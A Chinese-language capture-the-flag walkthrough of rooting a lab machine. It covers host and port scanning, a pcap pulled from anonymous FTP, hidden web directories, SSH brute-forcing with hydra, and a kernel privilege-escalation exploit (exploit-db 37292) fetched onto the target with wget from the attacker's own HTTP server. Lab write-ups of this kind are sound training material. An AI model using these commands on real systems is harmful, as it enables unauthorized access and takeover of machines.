测试过程
根据题目描述最终目标为：/root目录中的Proof.txt
信息搜集
目前还无法确定靶机的IP地址，首先需要主机发现
arp-scan -l
得到靶机的IP为：192.168.50.129
端口扫描：nmap -Pn -A -vv 192.168.50.129
扫描结果：
由图可知：靶机开启了21（ftp)、22（ssh）、80（http）端口，ftp可以匿名登录。
访问一下80端口看看：
一张图，啥都没
根据扫描结果再去访问下secret目录
也是啥都没

来到ftp服务，使用Anonymous匿名登录到ftp服务器，发现主目录下有一个lol.pcap文件
get lol.pcap将文件下载到本地当前目录，使用wireshark打开
在这里发现了一个提示：Here comes the directory listening.

继续往下翻
这里找到一个sup3rs3cr3tdirlol 提示，可能是个目录

在浏览器中访问该目录
这里有个文件，下载到本地查看一下文件类型
32位的elf可执行文件，赋予执行权限查看下

这里提示：Find address 0x0856BF to proceed

找到0x0856BF地址继续


在浏览器中访问这个目录
查看一下两个目录下都有什么内容



爆破SSH

将文件下载到本地，使用九头蛇来爆破一下hydra -L which_one_lol.txt -p Pass.txt 192.168.50.129 ssh
成功爆破出ssh账号：overflow，密码：Pass.txt

ssh去登录靶机ssh overflow@192.168.50.129，这里一直以为密码是Pass.txt的内容。。。实际上密码就是Pass.txt



提权

uname -a查看下内核

https://www.exploit-db.com/中搜索3.13.0查找可利用漏洞

https://www.exploit-db.com/exploits/37292

searchsploit37292在kali中搜索exp

进入到/usr/share/exploitdb/exploits/linux/local/ 中python3 -m http.server用python3开启一个http服务

回到ssh连接的会话中进入到/tmp目录下使用wget http://192.168.50.130:8000/37292.c下载exp

gcc 37292.c -o exp编译exp后执行



查看flag

成功获取root权限，查看/root/proof.txt文件
